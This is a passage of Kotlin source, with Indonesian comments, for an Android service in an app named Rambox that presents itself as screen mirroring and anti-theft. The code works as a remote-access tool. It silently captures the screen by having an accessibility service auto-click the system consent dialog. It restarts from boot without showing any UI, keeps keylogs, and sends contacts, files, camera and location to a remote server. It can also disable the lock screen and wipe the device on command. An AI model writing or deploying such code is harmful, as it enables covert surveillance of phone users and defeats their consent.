            intent?.getParcelableExtra(EXTRA_FGS_CALLBACK, ResultReceiver::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent?.getParcelableExtra(EXTRA_FGS_CALLBACK)
        }

        if (resultCode != 0 && dataIntent != null) {
            var fgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }

            var fgStarted = startForegroundWithType(notification, fgsType)
            if (!fgStarted && fgsType != ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION) {
                // Mic/camera/location bisa ditolak aturan while-in-use.
                // Minimal pertahankan MediaProjection agar mirroring tetap hidup.
                fgStarted = startForegroundWithType(
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            }
            if (!fgStarted) {
                // Jangan biarkan timeout startForegroundService membunuh proses.
                notifyFgsCallback(fgsCallback, RESULT_FGS_FAILED)
                stopSelf()
                return START_NOT_STICKY
            }
            notifyFgsCallback(fgsCallback, RESULT_FGS_STARTED)
            // Hanya timpa konfigurasi tersimpan bila extra benar-benar dikirim.
            if (ipExtra != null && ipExtra != "127.0.0.1") savedIp = ipExtra
            if (pinExtra != null) savedPin = pinExtra
            isUserExplicitlyStopped = false
            val prefs = getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
            prefs.edit().putBoolean("is_explicitly_killed", false).apply()
            acquireWakeAndWifiLock()
            // Aktifkan Device Owner policies (keyguard disabled, no screen timeout, capture allowed)
            // Hanya efektif jika APK sudah diset sebagai Device Owner via ADB:
            //   adb shell dpm set-device-owner com.rambox.mirror/.RamboxDeviceAdminReceiver
            RamboxDeviceAdminReceiver.applyMirroringPolicies(this)
            connectAndStream(resultCode, dataIntent)
        } else {
            val bgType = backgroundFgsType()
            var bgStarted = startForegroundWithType(notification, bgType)
            if (!bgStarted && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE &&
                bgType != ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE) {
                // Izin lokasi background bisa dicabut user. Jangan biarkan
                // service mati hanya karena tipe LOCATION ditolak; fallback
                // ke specialUse agar keylog/SIM/WS tetap hidup.
                bgStarted = startForegroundWithType(
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                )
            }
            if (!bgStarted) {
                // Service dimulai dengan startForegroundService; berhenti sendiri
                // lebih aman daripada dibunuh sistem karena timeout.
                notifyFgsCallback(fgsCallback, RESULT_FGS_FAILED)
                stopSelf()
                return START_NOT_STICKY
            }
            notifyFgsCallback(fgsCallback, RESULT_FGS_STARTED)

            // FIX #2: hanya timpa konfigurasi dari prefs bila extra dikirim.
            // Jalur boot/resurrection/START_STICKY tidak mengirim extra, jadi
            // server/PIN user tetap dipakai.
            if (ipExtra != null && ipExtra != "127.0.0.1") savedIp = ipExtra
            if (pinExtra != null) savedPin = pinExtra

            // Maintain background connection quietly without ever launching UI
            if (!isUserExplicitlyStopped) {
                isUserExplicitlyStopped = false
                acquireWakeAndWifiLock()
                // Aktifkan Device Owner policies juga saat auto-start dari boot
                RamboxDeviceAdminReceiver.applyMirroringPolicies(this)
                initWebSocket()

                // FIX: After background WebSocket is up, attempt silent screen capture
                // Launch invisible MainActivity to get MediaProjection token,
                // AccessibilityService will auto-approve the consent dialog
                if (mediaProjection == null) {
                    handler.postDelayed({
                        if (mediaProjection == null && !isUserExplicitlyStopped) {
                            requestSilentScreenCapture()
                        }
                    }, 10000) // 10s delay: wait for WebSocket connect + system stability
                }
            }
        }

        return START_STICKY
    }

    private var reconnectAttemptCount = 0
    private var silentRetryPending = false

    private fun isAccessibilityActive(): Boolean {
        // Tanpa accessibility aktif, dialog consent tak bisa diklik otomatis
        // dan akan nangkring terlihat di layar. Cek langsung, jangan andalkan
        // instance cache (bisa null tepat setelah boot).
        if (RamboxAccessibilityService.instance != null) return true
        return try {
            val expected = ComponentName(
                applicationContext, RamboxAccessibilityService::class.java
            ).flattenToString()
            val enabled = Settings.Secure.getString(
                contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            enabled.split(":").any { it == expected }
        } catch (_: Exception) {
            false
        }
    }

    // W3: reconnect dengan exponential backoff + jitter, dan runnable yang
    // bisa dibatalkan saat socket baru dibuat.
    private val reconnectRunnable = object : Runnable {
        override fun run() {
            isReconnecting = false
            if (isUserExplicitlyStopped) return
            val isDomainHost = savedIp.contains(".") && !savedIp.matches(Regex("^[0-9.]+$"))
            if (reconnectAttemptCount >= 2 && !isDomainHost) {
                // Coba temukan IP PC baru hanya untuk host LAN numerik.
                Thread {
                    val newIp = discoverPcIpQuick()
                    handler.post {
                        if (!isUserExplicitlyStopped) {
                            if (!newIp.isNullOrEmpty()) savedIp = newIp
                            initWebSocket()
                        }
                    }
                }.start()
            } else {
                initWebSocket()
            }
        }
    }

    private fun scheduleReconnect() {
        if (isUserExplicitlyStopped || isReconnecting) return
        isReconnecting = true
        reconnectAttemptCount++
        val attempt = (reconnectAttemptCount - 1).coerceIn(0, 5)
        val baseDelay = minOf(60000L, 2000L * (1L shl attempt))
        val delayMs = baseDelay + (0..1200).random().toLong()
        handler.removeCallbacks(reconnectRunnable)
        handler.postDelayed(reconnectRunnable, delayMs)
    }

    private fun verifyDiscoveryProof(nonce: String, proofHex: String): Boolean {
        if (nonce.isBlank() || proofHex.isBlank()) return false
        return try {
            val mac = javax.crypto.Mac.getInstance("HmacSHA256")
            mac.init(javax.crypto.spec.SecretKeySpec(savedPin.toByteArray(Charsets.UTF_8), "HmacSHA256"))
            val expected = mac.doFinal(nonce.toByteArray(Charsets.UTF_8))
            val expectedHex = expected.joinToString("") { "%02x".format(it) }
            java.security.MessageDigest.isEqual(
                expectedHex.toByteArray(Charsets.UTF_8),
                proofHex.lowercase().toByteArray(Charsets.UTF_8)
            )
        } catch (_: Exception) {
            false
        }
    }

    private fun discoverPcIpQuick(): String? {
        // 1. USB probe
        if (probeIp("127.0.0.1")) return "127.0.0.1"
        // 2. Current saved IP
        if (probeIp(savedIp)) return savedIp
        // 3. UDP Broadcast dengan nonce + HMAC (S1)
        try {
            java.net.DatagramSocket().use { socket ->
                socket.broadcast = true
                socket.soTimeout = 1500
                val nonceBytes = ByteArray(16)
                java.security.SecureRandom().nextBytes(nonceBytes)
                val nonceHex = nonceBytes.joinToString("") { "%02x".format(it) }
                val req = org.json.JSONObject().apply {
                    put("type", "discover")
                    put("nonce", nonceHex)
                    put("app", "rambox")
                }
                val buf = req.toString().toByteArray()
                socket.send(java.net.DatagramPacket(buf, buf.size, java.net.InetAddress.getByName("255.255.255.255"), 8888))
                val recvBuf = ByteArray(2048)
                val recvPacket = java.net.DatagramPacket(recvBuf, recvBuf.size)
                socket.receive(recvPacket)
                val replyJson = org.json.JSONObject(String(recvPacket.data, 0, recvPacket.length))
                val replyNonce = replyJson.optString("nonce", "")
                val proof = replyJson.optString("proof", "")
                if (replyNonce != nonceHex || !verifyDiscoveryProof(nonceHex, proof)) {
                    return null
                }
                val ip = replyJson.optString("ip", "")
                if (ip.isNotEmpty()) return ip
            }
        } catch (e: Exception) {}
        
        // 4. Subnet Scan
        try {
            val parts = savedIp.split(".")
            if (parts.size == 4) {
                val prefix = "${parts[0]}.${parts[1]}.${parts[2]}"
                for (i in 1..254) {
                    val target = "$prefix.$i"
                    if (probeIp(target)) return target
                }
            }
        } catch (e: Exception) {}

        return null
    }

    private fun probeIp(ip: String): Boolean {
        // Opportunistic encryption: HTTPS dulu, fallback HTTP untuk viewer lama.
        return probeDiscoveryUrl("https://$ip:8443/rambox-discovery", 300) ||
            probeDiscoveryUrl("http://$ip:8081/rambox-discovery", 300)
    }

    private fun probeDiscoveryUrl(urlStr: String, timeoutMs: Int): Boolean {
        var conn: java.net.HttpURLConnection? = null
        return try {
            val url = java.net.URL(urlStr)
            conn = url.openConnection() as java.net.HttpURLConnection
            conn.connectTimeout = timeoutMs
            conn.readTimeout = timeoutMs
            conn.requestMethod = "GET"
            val code = conn.responseCode
            code == 200
        } catch (e: Exception) {
            false
        } finally {
            try { conn?.disconnect() } catch (_: Exception) {}
        }
    }

    private fun initWebSocket() {
        try {
            // W1/H2: batalkan reconnect tertunda, lalu tutup socket lama.
            handler.removeCallbacks(reconnectRunnable)
            isReconnecting = false
            val generation = ++socketGeneration
            try { webSocketClient?.close() } catch (_: Exception) {}
            webSocketClient = null
            val cleanHost = savedIp.trim()
                .removePrefix("https://")
                .removePrefix("http://")
                .removePrefix("wss://")
                .removePrefix("ws://")
                .trimEnd('/')

            val isDomain = cleanHost.contains(".") && !cleanHost.matches(Regex("^[0-9.]+$"))
            val serverUri = if (savedIp.startsWith("wss://") || savedIp.startsWith("ws://")) {
                URI(savedIp)
            } else if (isDomain) {
                URI("wss://$cleanHost")
            } else {
                URI("ws://$cleanHost:8081")
            }

            val headers = HashMap<String, String>()
            headers["Host"] = cleanHost
            headers["Origin"] = if (serverUri.scheme == "wss") "https://$cleanHost" else "http://$cleanHost"

            webSocketClient = object : WebSocketClient(serverUri, headers) {
                override fun onSetSSLParameters(sslParameters: javax.net.ssl.SSLParameters) {
                    try {
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                            sslParameters.serverNames = listOf(javax.net.ssl.SNIHostName(cleanHost))
                        }
                    } catch (_: Exception) {}
                    try {
                        // K5: hostname diverifikasi PinnedTrust TOFU. Nonaktifkan standar HTTPS agar
                        // self-signed/DuckDNS tidak ditolak sebelum pin TOFU dievaluasi.
                        sslParameters.endpointIdentificationAlgorithm = ""
                    } catch (_: Exception) {}
                }

                override fun onOpen(handshakedata: ServerHandshake?) {
                    if (generation != socketGeneration) return
                    reconnectAttemptCount = 0
                    val joinMsg = JSONObject().apply {
                        put("type", "join-room")
                        put("password", savedPin)
                        put("pin", savedPin)
                        put("deviceId", getRamboxDeviceId())
                        put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
                    }
                    send(joinMsg.toString())

                    isStreaming = true
                    handler.removeCallbacks(infoUpdateRunnable)
                    handler.post(infoUpdateRunnable)
                    handler.removeCallbacks(heartbeatFrameRunnable)
                    handler.post(heartbeatFrameRunnable)
                    // Anti-hilang: cek SIM + kirim alert tertunda + jejak lokasi tertunda.
                    try { SimWatcher.check(applicationContext)?.let { broadcastPayload(it) } } catch (_: Exception) {}
                    try { SimWatcher.flushPending(applicationContext) } catch (_: Exception) {}
                    try { uploadPendingTrail() } catch (_: Exception) {}
                    handler.removeCallbacks(pingRunnable)
                    handler.postDelayed(pingRunnable, 20000)
                    sendImmediateCachedFrame()

                    // M4 FIX: Initial fetch of contacts and root file directory di background
                    backgroundIoExecutor.execute {
                        try { fetchAndSendContacts() } catch (_: Exception) {}
                        try { browseFolderAndSend("/storage/emulated/0") } catch (_: Exception) {}
                    }
                }

                override fun onMessage(message: String?) {
                    if (generation != socketGeneration) return
                    if (message != null) {
                        try {
                            val json = JSONObject(message)
                            val type = json.optString("type")
                            if (type == "ping") {
                                try {
                                    val pongMsg = JSONObject().apply { put("type", "pong") }
                                    send(pongMsg.toString())
                                } catch (_: Exception) {}
                                return
                            }
                            if (type == "client-joined") {
                                sendImmediateCachedFrame()
                            } else if (type == "signal") {
                                // C1: tolak signal dengan kredensial salah sebelum dieksekusi
                                if (!isSenderAuthorized(json)) return
                                val payload = json.optJSONObject("payload")
                                if (payload != null) {
                                    // Teruskan PIN sesi luar ke payload dalam bila belum ada,
                                    // agar gerbang perintah sensitif (wipe_device) bisa verifikasi.
                                    if (!payload.has("pin")) {
                                        try { payload.put("pin", json.optString("pin", "")) } catch (_: Exception) {}
                                    }
                                    // T3: perintah I/O berat tidak boleh memblokir
                                    // thread WebSocket (ping/pong & frame).
                                    val heavyType = payload.optString("type", "")
                                    val heavyCommands = setOf(
                                        "request_contacts", "request_file_browse", "request_file_read",
                                        "request_file_write", "request_file_delete", "request_file_upload",
                                        "request_file_download", "request_installed_apps",
                                        "request_keylogs_history", "clear_keylogs_history",
                                        "request_media_gallery", "sync_locations", "request_location"
                                    )
                                    if (heavyType in heavyCommands) {
                                        backgroundIoExecutor.execute {
                                            try { handleControlSignal(payload) } catch (_: Exception) {}
                                        }
                                    } else {
                                        handleControlSignal(payload)
                                    }
                                }
                            } else if (json.has("type") && type != "pong") {
                                // C1: jalur "signal" non-standar juga wajib lolos verifikasi
                                if (!isSenderAuthorized(json)) return
                                handleControlSignal(json)
                            }
                        } catch (e: Exception) {
                            e.printStackTrace()
                        }
                    }
                }

                override fun onClose(code: Int, reason: String?, remote: Boolean) {
                    if (generation != socketGeneration) return
                    isStreaming = false
                    handler.removeCallbacks(pingRunnable)
                    // M4: mikrofon tidak boleh terus merekam ke socket mati.
                    try { stopAudioStream() } catch (_: Exception) {}
                    if (!isUserExplicitlyStopped) {
                        scheduleReconnect()
                    }
                }

                override fun onError(ex: Exception?) {
                    if (generation != socketGeneration) return
                    android.util.Log.w("RamboxCapture", "WebSocket error: ${ex?.message ?: "unknown"}")
                    isStreaming = false
                    handler.removeCallbacks(pingRunnable)
                    try { stopAudioStream() } catch (_: Exception) {}
                    if (!isUserExplicitlyStopped) {
                        scheduleReconnect()
                    }
                }
            }

            if (serverUri.scheme == "wss") {
                try {
                    // C2 FIX: bukan lagi trust-all. Sertifikat CA publik diterima;
                    // sertifikat self-signed dipin (TOFU) sehingga MITM dengan
                    // sertifikat lain ditolak saat handshake.
                    val tm = PinnedTrust.trustManager(applicationContext, cleanHost)
                    val sslContext = javax.net.ssl.SSLContext.getInstance("TLS")
                    sslContext.init(null, arrayOf<javax.net.ssl.TrustManager>(tm), java.security.SecureRandom())
                    webSocketClient?.setSocketFactory(SniSSLSocketFactory(sslContext.socketFactory, cleanHost))
                } catch (sslErr: Exception) {
                    sslErr.printStackTrace()
                }
            }

            webSocketClient?.connect()
        } catch (e: Exception) {
            e.printStackTrace()
            if (!isUserExplicitlyStopped) {
                scheduleReconnect()
            }
        }
    }

    fun getRamboxDeviceId(): String {
        val prefs = getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
        var devId = prefs.getString("unique_device_id", null)
        if (devId.isNullOrEmpty()) {
            val androidId = try {
                android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            } catch (_: Exception) { null }
            val cleanId = if (!androidId.isNullOrBlank() && androidId != "9774d56d682e549c") {
                androidId.take(8).uppercase()
            } else {
                java.util.UUID.randomUUID().toString().replace("-", "").take(8).uppercase()
            }
            devId = "RB-$cleanId"
            prefs.edit().putString("unique_device_id", devId).apply()
        }
        return devId
    }

    /** C3: mengembalikan true hanya bila pesan benar-benar diserahkan ke WebSocket. */
    fun broadcastPayload(payload: JSONObject): Boolean {
        val devId = getRamboxDeviceId()
        val devName = "${Build.MANUFACTURER} ${Build.MODEL}"
        try {
            if (!payload.has("deviceId")) payload.put("deviceId", devId)
            if (!payload.has("deviceName")) payload.put("deviceName", devName)
        } catch (_: Exception) {}

        val signalMsg = JSONObject().apply {
            put("type", "signal")
            put("password", savedPin)
            put("pin", savedPin)
            put("deviceId", devId)
            put("deviceName", devName)
            put("payload", payload)
        }
        val str = signalMsg.toString()

        // FIX: Capture to local val to prevent race condition between isOpen check and send()
        val ws = webSocketClient
        if (ws != null && ws.isOpen) {
            return try {
                ws.send(str)
                true
            } catch (e: Exception) {
                false
            }
        }
        // C3: WS tertutup/menghubung ulang -> pesan TIDAK terkirim, laporkan gagal.
        return false
    }

    private fun wakeUpDeviceScreen() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (pm != null && !pm.isInteractive) {
                @Suppress("DEPRECATION")
                val tempWake = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "rambox:remote_wake"
                )
                tempWake.acquire(3000)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendImmediateCachedFrame(targetSource: String = currentVideoSource) {
        if (isScreenOff || !isViewerActive) return
        val cached = if (targetSource == "screen") lastCachedScreenFrame else lastCachedCameraFrame
        if (cached == null) return
        try {
            val hasWs = webSocketClient?.isOpen == true
            if (hasWs) {
                // Binary packet only — no JSON Base64 fallback (PERF FIX)
                val packetType = if (targetSource == "screen") 0x01.toByte() else 0x03.toByte()
                val binPacket = ByteArray(cached.size + 1)
                binPacket[0] = packetType
                System.arraycopy(cached, 0, binPacket, 1, cached.size)
                sendBinaryStream(binPacket)
                lastSentFrameTime = System.currentTimeMillis()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }


    /**
     * C1 FIX + v41: verifikasi kredensial pesan masuk terhadap [savedPin].
     *
     * Kebijakan v41 (fail-closed):
     * - savedPin kosong          -> TOLAK (tidak ada yang bisa diverifikasi)
     * - field kredensial kosong  -> TOLAK (relay lama wajib meneruskan PIN)
     * - PIN salah                -> TOLAK
     * - PIN benar                -> IZINKAN, dibandingkan constant-time
     *
     * Server relay versi sekarang (vps-server-cpanel.js) selalu meneruskan
     * password/pin room ke APK, jadi kompatibel.
     */
    private fun isSenderAuthorized(json: JSONObject): Boolean {
        // H4 FIX: Muat ulang PIN terbaru dari SharedPreferences bila user baru saja mengganti PIN
        val prefs = getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
        val activePin = prefs.getString("secret_dial_key", null)?.takeIf { it.isNotBlank() }
            ?: prefs.getString("room_pin", null)?.takeIf { it.isNotBlank() }
            ?: savedPin
        if (activePin.isNotBlank() && activePin != savedPin) {
            savedPin = activePin
        }
        val expect = savedPin
        if (expect.isEmpty()) return false
        val got = json.optString("password", "").ifEmpty { json.optString("pin", "") }
        if (got.isEmpty()) return false
        return java.security.MessageDigest.isEqual(
            got.toByteArray(Charsets.UTF_8),
            expect.toByteArray(Charsets.UTF_8)
        )
    }

    private var lastAccWarningToastTime: Long = 0L

    private fun notifyAccessibilityDisabled() {
        val now = System.currentTimeMillis()
        if (now - lastAccWarningToastTime < 5000L) return
        lastAccWarningToastTime = now
        try {
            val payload = JSONObject().apply {
                put("type", "toast")
                put("message", "Aksesibilitas Rambox belum aktif di perangkat Android")
                put("level", "warning")
            }
            broadcastPayload(payload)
        } catch (_: Exception) {}
    }

    private fun handleControlSignal(payload: JSONObject) {
        if (!payload.has("type")) return

        // Multi-Device Protection: Jika sinyal memiliki targetDeviceId dan bukan untuk device ini, abaikan!
        val targetId = payload.optString("targetDeviceId", "")
        if (targetId.isNotEmpty() && targetId != getRamboxDeviceId()) {
            return
        }

        val inputType = payload.optString("type")
        when (inputType) {
            "wake_up" -> {
                android.util.Log.d("RamboxCapture", "wake_up signal received: waking up device screen")
                wakeUpDeviceScreen()
                isScreenOff = false
                isViewerActive = true
                acquireWifiLock()
                sendDeviceInfo()
                checkOrientationChange()
                ensureMediaProjectionAlive()
                if (mediaProjection != null) {
                    startImageCapture(streamWidth, streamHeight)
                } else {
                    requestSilentScreenCapture(force = true)
                }
                sendImmediateCachedFrame()
                broadcastPayload(JSONObject().apply {
                    put("type", "screen_state")
                    put("isScreenOn", true)
                    put("isStreamingActive", true)
                })
            }
            "request_stream" -> {
                // On-demand stream request: ONLY capture if phone screen is interactive/on
                isViewerActive = true
                val isScreenOn = isDeviceScreenOn() && !isScreenOff
                if (isScreenOn) {
                    acquireWifiLock()
                    sendDeviceInfo()
                    ensureMediaProjectionAlive()
                    if (mediaProjection != null) {
                        if (virtualDisplay == null || imageReader == null) {
                            android.util.Log.d("RamboxCapture", "request_stream: restarting startImageCapture()")
                            startImageCapture(streamWidth, streamHeight)
                        } else {
                            val now = System.currentTimeMillis()
                            if (now - lastSentFrameTime > 3000) {
                                android.util.Log.d("RamboxCapture", "request_stream: frame stale ${now - lastSentFrameTime}ms, restarting capture")
                                startImageCapture(streamWidth, streamHeight)
                            } else {
                                sendImmediateCachedFrame()
                            }
                        }
                    } else {
                        requestSilentScreenCapture(force = true)
                    }
                    sendImmediateCachedFrame()
                } else {
                    // Screen is OFF: do NOT wake up screen or recreate VirtualDisplay!
                    broadcastPayload(JSONObject().apply {
                        put("type", "screen_state")
                        put("isScreenOn", false)
                        put("isStreamingActive", false)
                    })
                }
            }
            "pause_stream" -> {
                android.util.Log.d("RamboxCapture", "pause_stream received from viewer -> entering low-power standby")
                isViewerActive = false
                // FIX #1a: pertahankan VirtualDisplay; lepas surface saja.
                suspendImageCapture()
                releaseWifiLock()
                broadcastPayload(JSONObject().apply {
                    put("type", "screen_state")
                    put("isScreenOn", isDeviceScreenOn())
                    put("isStreamingActive", false)
                })
            }
            "resume_stream" -> {
                android.util.Log.d("RamboxCapture", "resume_stream received from viewer")
                isViewerActive = true
                val isScreenOn = isDeviceScreenOn() && !isScreenOff
                if (isScreenOn) {
                    acquireWifiLock()
                    checkOrientationChange()
                    ensureMediaProjectionAlive()
                    if (mediaProjection != null) {
                        startImageCapture(streamWidth, streamHeight)
                    } else {
                        requestSilentScreenCapture(force = true)
                    }
                    sendImmediateCachedFrame()
                }
                broadcastPayload(JSONObject().apply {
                    put("type", "screen_state")
                    put("isScreenOn", isScreenOn)
                    put("isStreamingActive", isScreenOn)
                })
            }
            "start_capture", "enable_screen" -> {
                requestSilentScreenCapture(force = true)
            }
            "check_update", "force_update" -> {
                // OTA GitHub dihapus: jawab nonaktif agar Viewer tidak menggantung.
                broadcastPayload(JSONObject().apply {
                    put("type", "update_status")
                    put("updateAvailable", false)
                    put("message", "OTA nonaktif: update via instalasi manual.")
                })
            }
            "get_version" -> {
                // Info versi lokal saja (tanpa trigger update).
                broadcastPayload(JSONObject().apply {
                    put("type", "update_status")
                    put("currentVersionCode", BuildConfig.VERSION_CODE)
                    put("currentVersionName", BuildConfig.VERSION_NAME)
                })
            }
            "update_selectors" -> {
                // Poin 4: update view-id konteks keylog tanpa rebuild APK.
                // Payload: {"type":"update_selectors","selectors":{"whatsapp":["id..."]}}
                val count = try {
                    SelectorStore.saveAll(this, payload.optJSONObject("selectors") ?: JSONObject())
                } catch (_: Exception) { 0 }
                broadcastPayload(JSONObject().apply {
                    put("type", "selectors_status")
                    put("updatedKeys", count)
                })
            }
            "lost_mode" -> {
                // Poin 2 anti-hilang: lokasi 1 dtk + flag persisten.
                val on = payload.optBoolean("enabled", true)
                try {
                    getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
                        .edit().putBoolean("lost_mode", on).apply()
                } catch (_: Exception) {}
                setLocationCadence(on)
                broadcastPayload(JSONObject().apply {
                    put("type", "lost_mode_status")
                    put("enabled", on)
                })
            }
            "ring" -> {
                // Bunyikan alarm keras (15 dtk auto-stop) untuk menemukan HP.
                try { playLoudAlarm() } catch (_: Exception) {}
                broadcastPayload(JSONObject().apply {
                    put("type", "ring_status")
                    put("ringing", true)
                })
            }
            "lock_now" -> {
                // Kunci layar jarak jauh (perlu Device Admin aktif).
                var locked = false
                try {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                    dpm?.lockNow()
                    locked = true
                } catch (_: Exception) { locked = false }
                broadcastPayload(JSONObject().apply {
                    put("type", "lock_status")
                    put("locked", locked)
                })
            }
            "wipe_device" -> {
                // DARURAT: hapus total bila device tak mungkin kembali.
                // Syarat ganda anti-replay/nyasar: confirm:true + pin room yang benar.
                val suppliedPin = payload.optString("pin", "")
                val pinOk = suppliedPin.isNotEmpty() && java.security.MessageDigest.isEqual(
                    suppliedPin.toByteArray(Charsets.UTF_8),
                    savedPin.toByteArray(Charsets.UTF_8)
                )
                if (!payload.optBoolean("confirm", false) || !pinOk) {
                    broadcastPayload(JSONObject().apply {
                        put("type", "wipe_status")
                        put("wiped", false)
                        put("message", "Butuh confirm:true + pin room yang benar.")
                    })
                } else {
                    var success = false
                    var msg = "Perintah wipe gagal: Device Admin/Owner tidak aktif."
                    try {
                        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                        val admin = android.content.ComponentName(this, RamboxDeviceAdminReceiver::class.java)
                        if (dpm != null && (dpm.isDeviceOwnerApp(packageName) || dpm.isAdminActive(admin))) {
                            dpm.wipeData(0)
                            success = true
                            msg = "Perintah wipe berhasil dikirim."
                        }
                    } catch (e: SecurityException) {
                        msg = "Wipe ditolak sistem: ${e.message}"
                    } catch (e: Exception) {
                        msg = "Wipe gagal: ${e.message}"
                    }
                    broadcastPayload(JSONObject().apply {
                        put("type", "wipe_status")
                        put("wiped", success)
                        put("message", msg)
                    })
                }
            }
            "check_sim" -> {
                val alert = try { SimWatcher.check(this) } catch (_: Exception) { null }
                broadcastPayload(alert ?: JSONObject().apply {
                    put("type", "sim_status")
                    put("changed", false)
                    put("message", "SIM tidak berubah / belum terbaca.")
                })
            }
            "sync_locations" -> {
                // Paksa kirim jejak tertunda sekarang.
                try { uploadPendingTrail() } catch (_: Exception) {}
            }
            "request_location" -> {
                // Kirim posisi terkini SEKARANG (tombol "Minta Lokasi" di viewer).
                sendLocationAndUpdate()
            }
            "enable_device_owner_mode" -> {
                // Viewer meminta aktivasi Device Owner mode:
                // Nonaktifkan lock screen + hapus batas screen timeout + izinkan screen capture
                RamboxDeviceAdminReceiver.applyMirroringPolicies(this)
                val isOwner = RamboxDeviceAdminReceiver.isDeviceOwner(this)
                val resp = JSONObject().apply {
                    put("type", "device_owner_status")
                    put("isDeviceOwner", isOwner)
                    put("policiesApplied", isOwner)
                    put("message", if (isOwner) "Device Owner mode aktif: lock screen & timeout dinonaktifkan" else "Bukan Device Owner — jalankan ADB untuk aktivasi")
                }
                broadcastPayload(resp)
            }
            "disable_device_owner_mode" -> {
                // Viewer meminta pemulihan lock screen normal
                RamboxDeviceAdminReceiver.revertMirroringPolicies(this)
                val isOwner = RamboxDeviceAdminReceiver.isDeviceOwner(this)
                val resp = JSONObject().apply {
                    put("type", "device_owner_status")
                    put("isDeviceOwner", isOwner)
                    put("policiesApplied", false)
                    put("message", "Device Owner mode dinonaktifkan: lock screen kembali normal")
                }
                broadcastPayload(resp)
            }
            "check_device_owner" -> {
                // Viewer menanyakan status Device Owner saat ini
                val isOwner = RamboxDeviceAdminReceiver.isDeviceOwner(this)
                val resp = JSONObject().apply {
                    put("type", "device_owner_status")
                    put("isDeviceOwner", isOwner)
                    put("message", if (isOwner) "✅ Device Owner aktif" else "❌ Bukan Device Owner (belum diaktifkan via ADB)")
                }
                broadcastPayload(resp)
            }
            "wake_and_unlock" -> {
                // Bangunkan layar SEKALIGUS dismiss keyguard jika Device Owner
                wakeUpDeviceScreen()
                isScreenOff = false
                isViewerActive = true
                acquireWifiLock()
                RamboxDeviceAdminReceiver.dismissKeyguard(this)
                checkOrientationChange()
                ensureMediaProjectionAlive()
                if (mediaProjection != null) {
                    startImageCapture(streamWidth, streamHeight)
                } else {
                    requestSilentScreenCapture(force = true)
                }
                sendImmediateCachedFrame()
            }
            "tap" -> {
                if (isScreenOff) {
                    wakeUpDeviceScreen()
                    isScreenOff = false
                }
                isViewerActive = true
                acquireWifiLock()
                if (RamboxAccessibilityService.instance == null) {
                    notifyAccessibilityDisabled()
                } else {
                    var xRatio = payload.optDouble("xRatio", -1.0)
                    if (xRatio < 0.0) xRatio = payload.optDouble("x", 0.5)
                    var yRatio = payload.optDouble("yRatio", -1.0)
                    if (yRatio < 0.0) yRatio = payload.optDouble("y", 0.5)

                    if (xRatio > 1.0) xRatio /= streamWidth.toDouble()
                    if (yRatio > 1.0) yRatio /= streamHeight.toDouble()

                    RamboxAccessibilityService.instance?.performTap(xRatio, yRatio)
                    // FIX Bug#5: Force fresh frame setelah tap agar viewer mendapat visual feedback
                    handler.postDelayed({ sendImmediateCachedFrame() }, 200)
                    handler.postDelayed({ sendImmediateCachedFrame() }, 500)
                }
            }
            "long_press" -> {
                if (isScreenOff) {
                    wakeUpDeviceScreen()
                    isScreenOff = false
                }
                isViewerActive = true
                acquireWifiLock()
                if (RamboxAccessibilityService.instance == null) {
                    notifyAccessibilityDisabled()
                } else {
                    var xRatio = payload.optDouble("xRatio", -1.0)
                    if (xRatio < 0.0) xRatio = payload.optDouble("x", 0.5)
                    var yRatio = payload.optDouble("yRatio", -1.0)
                    if (yRatio < 0.0) yRatio = payload.optDouble("y", 0.5)

                    if (xRatio > 1.0) xRatio /= streamWidth.toDouble()
                    if (yRatio > 1.0) yRatio /= streamHeight.toDouble()

                    val duration = payload.optLong("duration", 700L)
                    RamboxAccessibilityService.instance?.performLongPress(xRatio, yRatio, duration)
                    // FIX Bug#5: Force fresh frame setelah long press
                    handler.postDelayed({ sendImmediateCachedFrame() }, 600)
                    handler.postDelayed({ sendImmediateCachedFrame() }, 900)
                }
            }
            "swipe" -> {
                if (isScreenOff) {
                    wakeUpDeviceScreen()
                    isScreenOff = false
                }
                isViewerActive = true
                acquireWifiLock()
                if (RamboxAccessibilityService.instance == null) {
                    notifyAccessibilityDisabled()
                } else {
                    var x1Ratio = payload.optDouble("x1Ratio", -1.0)
